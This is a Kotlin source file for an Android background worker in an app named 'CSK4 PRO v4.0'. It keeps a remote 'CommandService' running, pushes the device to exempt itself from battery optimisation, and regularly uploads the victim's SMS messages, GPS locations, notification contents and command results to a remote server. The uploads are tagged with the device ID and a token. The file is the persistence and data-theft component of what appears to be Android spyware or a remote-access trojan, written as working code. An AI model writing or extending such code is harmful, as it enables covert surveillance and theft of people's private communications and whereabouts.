package com.csk4.app

import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject

/**
 * ============================================
 * CSK4 PRO v4.0 - WorkManager Service
 * ============================================
 * Ye background worker hai jo:
 * - Har 15 min service check karta hai
 * - Offline data server pe bhejta hai
 * - Service zinda hai ya nahi check karta hai
 * - Auto-restart trigger karta hai
 * ============================================
 */
class WorkManagerService(
    private val ctx: Context,
    params: WorkerParameters
) : Worker(ctx, params) {

    companion object {
        private const val TAG = "CSK4_WORKER"
    }

    override fun doWork(): Result {
        Log.d(TAG, "🔄 WorkManager triggered")

        try {
            // 1. Check if CommandService is running
            if (!isServiceRunning()) {
                Log.d(TAG, "⚠️ Service not running — restarting...")
                restartService()
            } else {
                Log.d(TAG, "✅ Service is running")
            }

            // 2. Sync offline queue
            syncOfflineData()

            // 3. Send heartbeat
            sendHeartbeat()

            // 4. Check battery optimization
            checkBatteryOptimization()

            // 5. Update local data
            cleanupOldData()

            Log.d(TAG, "✅ WorkManager completed successfully")
            return Result.success()

        } catch (e: Exception) {
            Log.e(TAG, "❌ WorkManager error: ${e.message}")
            return Result.retry()
        }
    }

    // ============ CHECK SERVICE RUNNING ============
    private fun isServiceRunning(): Boolean {
        return try {
            val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) 
                as android.app.ActivityManager
            val services = manager.getRunningServices(Int.MAX_VALUE)
            
            for (service in services) {
                if (service.service.className == CommandService::class.java.name) {
                    return true
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "isServiceRunning error: ${e.message}")
            false
        }
    }

    // ============ RESTART SERVICE ============
    private fun restartService() {
        try {
            val intent = Intent(ctx, CommandService::class.java)
            
            if (Build.VERSION.SDK_INT >= 26) {
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
            
            Log.d(TAG, "🚀 Service restarted")
        } catch (e: Exception) {
            Log.e(TAG, "Restart error: ${e.message}")
        }
    }

    // ============ SYNC OFFLINE DATA ============
    private fun syncOfflineData() {
        try {
            val localStorage = LocalStorage(ctx)
            
            // Get counts
            val pendingCommands = localStorage.getPendingCommandResults().size
            val pendingHeartbeats = localStorage.getPendingHeartbeats().size
            val pendingLocations = localStorage.getPendingLocations().size
            val pendingSMS = localStorage.getPendingSMS().size
            val pendingNotifs = localStorage.getPendingNotifications().size
            val total = pendingCommands + pendingHeartbeats + pendingLocations + pendingSMS + pendingNotifs
            
            Log.d(TAG, "📊 Pending items: $total")
            
            if (total == 0) {
                Log.d(TAG, "✅ No pending data to sync")
                return
            }

            val deviceId = Settings.Secure.getString(
                ctx.contentResolver,
                Settings.Secure.ANDROID_ID
            )

            // Sync command results
            localStorage.getPendingCommandResults().forEach { (id, result) ->
                val json = JSONObject().apply {
                    put("commandId", id)
                    put("result", result)
                }
                postData("${Config.SERVER_URL}/api/device/command-done", json) {
                    localStorage.markCommandSynced(id)
                }
            }

            // Sync heartbeats
            localStorage.getPendingHeartbeats().forEach { hb ->
                val json = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("battery", hb)
                    put("token", Config.DEVICE_TOKEN)
                }
                postData("${Config.SERVER_URL}/api/device/heartbeat", json) {
                    localStorage.markHeartbeatSynced(hb)
                }
            }

            // Sync locations
            localStorage.getPendingLocations().forEach { loc ->
                val json = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("lat", loc.first)
                    put("lng", loc.second)
                    put("token", Config.DEVICE_TOKEN)
                }
                postData("${Config.SERVER_URL}/api/device/location", json) {
                    localStorage.markLocationSynced(loc.first, loc.second)
                }
            }

            // Sync SMS
            val smsList = localStorage.getPendingSMS()
            if (smsList.isNotEmpty()) {
                val arr = org.json.JSONArray()
                smsList.forEach { arr.put(it) }
                val json = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("messages", arr)
                    put("token", Config.DEVICE_TOKEN)
                }
                postData("${Config.SERVER_URL}/api/device/messages", json) {
                    localStorage.clearSyncedSMS()
                }
            }

            // Sync notifications
            localStorage.getPendingNotifications().forEach { n ->
                val json = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("package", n.optString("package"))
                    put("title", n.optString("title"))
                    put("text", n.optString("text"))
                    put("token", Config.DEVICE_TOKEN)
                }
                postData("${Config.SERVER_URL}/api/device/notification", json) {
                    localStorage.markNotificationSynced(n.optString("id"))
                }
            }

            Log.d(TAG, "📤 Offline sync triggered: $total items")
        } catch (e: Exception) {
            Log.e(TAG, "Sync error: ${e.message}")
        }
    }

    // ============ SEND HEARTBEAT ============
    private fun sendHeartbeat() {
        try {
            val deviceId = Settings.Secure.getString(
                ctx.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) 
                as android.os.BatteryManager
            val battery = bm.getIntProperty(
                android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY
            )

            val json = JSONObject().apply {
                put("deviceId", deviceId)
                put("battery", battery)
                put("token", Config.DEVICE_TOKEN)
                put("source", "workmanager")
            }

            postData("${Config.SERVER_URL}/api/device/heartbeat", json) {
                Log.d(TAG, "💓 Heartbeat sent via WorkManager")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Heartbeat error: ${e.message}")
        }
    }

    // ============ CHECK BATTERY OPTIMIZATION ============
    private fun checkBatteryOptimization() {
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                val pm = ctx.getSystemService(Context.POWER_SERVICE) 
                    as android.os.PowerManager
                
                if (!pm.isIgnoringBatteryOptimizations(ctx.packageName)) {
                    Log.w(TAG, "⚠️ Battery optimization is ON")
                    
                    // Try to open settings automatically
                    try {
                        val intent = Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                        )
                        intent.data = android.net.Uri.parse("package:${ctx.packageName}")
                        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        ctx.startActivity(intent)
                    } catch (e: Exception) {
                        Log.e(TAG, "Cannot open battery settings: ${e.message}")
                    }
                } else {
                    Log.d(TAG, "✅ Battery optimization OFF")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Battery check error: ${e.message}")
        }
    }

    // ============ CLEANUP OLD DATA ============
    private fun cleanupOldData() {
        try {
            val localStorage = LocalStorage(ctx)
            localStorage.cleanup()
            Log.d(TAG, "🧹 Old data cleaned")
        } catch (e: Exception) {
            Log.e(TAG, "Cleanup error: ${e.message}")
        }
    }

    // ============ POST DATA ============
    private fun postData(url: String, json: JSONObject, onSuccess: () -> Unit) {
        try {
            val request = JsonObjectRequest(
                Request.Method.POST,
                url,
                json,
                { onSuccess() },
                { error ->
                    Log.e(TAG, "POST failed: ${error.message}")
                }
            )
            Volley.newRequestQueue(ctx).add(request)
        } catch (e: Exception) {
            Log.e(TAG, "POST exception: ${e.message}")
        }
    }
}
